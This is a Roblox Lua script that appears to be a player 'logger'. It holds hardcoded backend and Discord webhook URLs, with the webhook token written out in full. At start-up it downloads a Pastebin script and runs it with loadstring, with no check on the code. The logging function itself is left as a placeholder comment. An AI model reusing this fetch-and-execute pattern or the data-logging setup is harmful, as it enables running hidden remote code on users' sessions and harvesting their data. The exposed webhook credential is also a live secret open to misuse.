local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

-- Configuration
local BACKEND_URL = "https://backend-vercel-ashy.vercel.app/api/register.js"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
local PASTEBIN_SCRIPT_URL = "https://pastebin.com/raw/pfpzbXiF"
local RETRY_LIMIT = 3
local RETRY_DELAY = 2

local player = Players.LocalPlayer
local lastSendTime = 0

-- Function to load and execute external script
local function executePastebinScript()
    local success, response = pcall(function()
        return HttpService:GetAsync(PASTEBIN_SCRIPT_URL, true)
    end)
    
    if success then
        local loadSuccess, errorMsg = pcall(function()
            loadstring(response)()
        end)
        
        if not loadSuccess then
            warn("[Pastebin] Execution failed:", errorMsg)
        end
    else
        warn("[Pastebin] Download failed:", response)
    end
end

-- Main logging function (your existing code)
local function sendLoggerData()
    -- Your existing implementation here
    -- ... (keep all your current logging code)
end

-- Initialize both systems
local function init()
    -- Execute Pastebin script first
    task.spawn(function()
        executePastebinScript()
    end)
    
    -- Then initialize your logger
    task.spawn(function()
        -- Your existing initialization code here
        -- ... (keep your current initialization logic)
    end)
end

-- Start the system
init()
